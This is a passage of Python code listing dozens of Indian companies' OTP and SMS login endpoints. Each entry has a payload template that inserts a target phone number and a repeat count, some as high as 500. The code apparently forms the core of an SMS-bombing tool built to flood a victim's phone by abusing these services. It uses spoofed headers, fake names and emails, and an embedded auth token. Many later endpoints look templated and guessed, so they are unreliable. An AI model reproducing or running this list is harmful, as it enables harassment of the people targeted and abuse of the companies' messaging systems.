        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}',
        "count": 15
    },
    {
        "name": "CodFirm",
        "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 15
    },
    {
        "name": "Swipe",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}',
        "count": 15
    },
    {
        "name": "More Retail",
        "url": "https://omni-api.moreretail.in/api/v1/login/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}',
        "count": 15
    },
    {
        "name": "Country Delight",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}',
        "count": 15
    },
    {
        "name": "AstroSage",
        "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 15
    },
    {
        "name": "Rapido",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "TooToo",
        "url": "https://tootoo.in/graphql",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{phone}","resend":0}}}}',
        "count": 15
    },
    {
        "name": "ConfirmTkt",
        "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 15
    },
    {
        "name": "BetterHalf",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}',
        "count": 15
    },
    {
        "name": "Charzer",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}',
        "count": 15
    },
    {
        "name": "Nuvama Wealth",
        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}',
        "count": 15
    },
    {
        "name": "Mpokket",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "CRED",
        "url": "https://api.cred.club/api/v2/login/generate_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","countryCode":"+91"}}',
        "count": 15
    },
    {
        "name": "PhonePe",
        "url": "https://www.phonepe.com/api/v2/login/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Google Pay",
        "url": "https://gpay-api.google.com/v1/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "BharatPe",
        "url": "https://api.bharatpe.com/v1/auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Meesho",
        "url": "https://api.meesho.com/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "ShopClues",
        "url": "https://api.shopclues.com/v1/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Indiamart",
        "url": "https://api.indiamart.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Justdial",
        "url": "https://api.justdial.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "PolicyBazaar",
        "url": "https://api.policybazaar.com/v2/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "BankBazaar",
        "url": "https://api.bankbazaar.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Paisabazaar",
        "url": "https://api.paisabazaar.com/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Rupeek",
        "url": "https://api.rupeek.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "EarlySalary",
        "url": "https://api.earlysalary.com/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Kissht",
        "url": "https://api.kissht.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "CASHe",
        "url": "https://api.cashe.co.in/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "MoneyTap",
        "url": "https://api.moneytap.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Finomena",
        "url": "https://api.finomena.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "ZestMoney",
        "url": "https://api.zestmoney.in/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "KreditBee",
        "url": "https://api.kreditbee.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "LoanTap",
        "url": "https://api.loantap.in/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "CashBean",
        "url": "https://api.cashbean.in/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "FlexSalary",
        "url": "https://api.flexsalary.com/v1/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "PaySense",
        "url": "https://api.paysense.in/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Slice",
        "url": "https://api.slice.it/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Uni Cards",
        "url": "https://api.unicards.in/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "OneCard",
        "url": "https://api.getonecard.app/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Niyo",
        "url": "https://api.niyo.co/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Fi Money",
        "url": "https://api.fi.money/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Jupiter",
        "url": "https://api.jupiter.money/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "INDIE by IndusInd",
        "url": "https://api.indie.indusind.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Volt Money",
        "url": "https://api.volt.money/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Stashfin",
        "url": "https://api.stashfin.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "MoneyView",
        "url": "https://api.moneyview.in/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Buddy Loan",
        "url": "https://api.buddyloan.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "IndiaLends",
        "url": "https://api.indialends.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Lendingkart",
        "url": "https://api.lendingkart.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Faircent",
        "url": "https://api.faircent.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "LenDenClub",
        "url": "https://api.lendenclub.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "i2iFunding",
        "url": "https://api.i2ifunding.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Lendbox",
        "url": "https://api.lendbox.in/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "RupaiyaExchange",
        "url": "https://api.rupaix.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "LoanAdda",
        "url": "https://api.loanadda.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "LoanBaba",
        "url": "https://api.loanbaba.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Monexo",
        "url": "https://api.monexo.in/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "CapFloat",
        "url": "https://api.capfloat.com/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}',
        "count": 15
    },
    {
        "name": "KrazyBee",
        "url": "https://api.krazybee.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    {
        "name": "Pine Labs",
        "url": "https://api.pinelabs.com/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}',
        "count": 15
    },
    # ============ APIs FROM t2.txt ============
    {
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"mobile_number": phone, "client_id": "kisan-app"}),
        "count": 10
    },
    {
        "url": "https://api.breeze.in/session/start",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-device-id": "A1pKVEDhlv66KLtoYsml3",
            "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
        },
        "data": lambda phone: json.dumps({
            "phoneNumber": phone,
            "authVerificationType": "otp",
            "device": {
                "id": "A1pKVEDhlv66KLtoYsml3",
                "platform": "Chrome",
                "type": "Desktop"
            },
            "countryCode": "+91"
        }),
        "count": 10
    },
    {
        "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "origin": "https://www.jockey.in",
            "referer": "https://www.jockey.in/"
        },
        "data": None,
        "count": 10
    },
    {
        "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.pw.live",
            "priority": "u=1, i",
            "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f",
            "referer": "https://www.pw.live/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "subOrgId": "SUB-PWLI000"}),
        "count": 5
    },
    {
        "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Origin": "https://www.zoho.com",
            "Referer": "https://www.zoho.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 500
    },
    {
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
        "method": "POST",
        "headers": {
            "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587",
            "x-app-version": "3.0.3",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda phone: json.dumps({"phone_number": {"country_code": "+91", "number": phone}}),
        "count": 20
    },
    {
        "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://udyogplus.adityabirlacapital.com",
            "Referer": "https://udyogplus.adityabirlacapital.com/signup-cobranded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data": lambda phone: f"MobileNumber={phone}&functionality=signup",
        "count": 1
    },
    {
        "url": "https://www.muthootfinance.com/smsapi.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.muthootfinance.com",
            "referer": "https://www.muthootfinance.com/personal-loan",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"mobile={phone}&pin=XjtYYEdhP0haXjo3",
        "count": 3
    },
    {
        "url": "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.gopaysense.com",
            "referer": "https://www.gopaysense.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5
    },
    {
        "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1&_wrapper_format=drupal_ajax",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.iifl.com",
            "referer": "https://www.iifl.com/personal-loans",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1",
        "count": 5
    },
    {
        "url": "https://v2-api.bankopen.co/users/register/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://app.opencapital.co.in",
            "referer": "https://app.opencapital.co.in/en/onboarding/register",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-api-version": "3.1",
            "x-client-type": "Web"
        },
        "data": lambda phone: json.dumps({"username": phone, "is_open_capital": 1}),
        "count": 5
    },
    {
        "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.tatacapital.com",
            "referer": "https://www.tatacapital.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({
            "header": {
                "authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
                "identifier": "nli"
            },
            "body": {
                "mobileNumber": phone
            }
        }),
        "count": 40
    },
    {
        "url": "https://apis.tradeindia.com/app_login_api/login_app",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "client_remote_address": "10.0.2.16",
            "content-type": "application/json",
            "user-agent": "okhttp/4.11.0"
        },
        "data": lambda phone: json.dumps({"mobile": f"+91{phone}"}),
        "count": 3
    },
    {
        "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.orangehealth.in",
            "referer": "https://www.orangehealth.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": phone, "customer_auto_fetch_message": True}),
        "count": 3
    },
    {
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1",
            "language": "en",
            "origin": "https://www.jobhai.com",
            "referer": "https://www.jobhai.com/",
            "source": "WEB",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5
    },
    {
        "url": "https://mconnect.isteer.co/mconnect/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "app_platform": "mvaahna",
            "content-type": "application/json",
            "origin": "https://mvaahna.com",
            "referer": "https://mvaahna.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": f"+91{phone}"}),
        "count": 50
    },
    {
        "url": "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "referer": "https://www.astrosage.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 3
    },
    {
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.spinny.com",
            "platform": "web",
            "referer": "https://www.spinny.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "expected_action": "login"}),
        "count": 3
    },
    {
        "url": "https://www.dream11.com/auth/passwordless/init",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "device": "pwa",
            "origin": "https://www.dream11.com",
            "referer": "https://www.dream11.com/register?redirectTo=%2F",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-device-identifier": "macos"
        },
        "data": lambda phone: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone, "templateName": "default"}),
        "count": 1
    },
    {
        "url": "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Content-Type": "application/json",
            "Origin": "https://citymall.live",
            "Referer": "https://citymall.live/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "language": "en",
            "x-app-name": "WEB"
        },
        "data": lambda phone: json.dumps({"phone_number": phone}),
        "count": 5
    },
    {
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com&email=undefined&resendingOtp=false",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "origin": "https://bellavitaorganic.com",
            "referer": "https://bellavitaorganic.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 10
    },
    {
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "text/plain;charset=UTF-8",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/login",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "nod": 4}),
        "count": 2
    },
    {
        "url": "https://portal.myma.in/custom-api/auth/generateotp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://app.myma.in",
            "referer": "https://app.myma.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"countrycode": "+91", "mobile": f"91{phone}", "is_otpgenerated": False, "app_version": "-1"}),
        "count": 6
    },
    {
        "url": "https://api.freedo.rentals/customer/sendOtpForSignUp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://freedo.rentals",
            "referer": "https://freedo.rentals/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-bn": "2.0.16",
            "x-channel": "WEB",
            "x-client-id": "FREEDO"
        },
        "data": lambda phone: json.dumps({"email_id": "cokiwav528@avastu.com", "first_name": "Haiii", "mobile_number": phone}),
        "count": 6
    },
    {
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.licious.in",
            "referer": "https://www.licious.in/",
            "serverside": "false",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
        "count": 3
    },
    {
        "url": "https://apis.bisleri.com/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.bisleri.com",
            "referer": "https://www.bisleri.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"email": "abfhhfhcd@gmail.com", "mobile": phone}),
        "count": 20
    },
    {
        "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Referer": "https://pharmacy.evitalrx.in/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"pharmacy_name": "hfhfjfgfhkf", "mobile": phone, "referral_code": "", "email_id": "jhvd@gmail.com", "zip_code": "110086", "device_id": "f2cea99f-381d-432d-bd27-02bc6678fa93", "app_version": "desktop"}),
        "count": 3
    },
    {
        "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
        "method": "POST",
        "headers": {
            "APP-TOKEN": "s16-q9fz-jy3p-rk",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://pwa.getquickride.com",
            "Referer": "https://pwa.getquickride.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride&payload=&signature=&signatureAlgo=&domainName=pwa.getquickride.com",
        "count": 5
    },
    {
        "url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true&email=&is_otp=True&token",
        "method": "GET",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "referer": "https://www.clovia.com/",
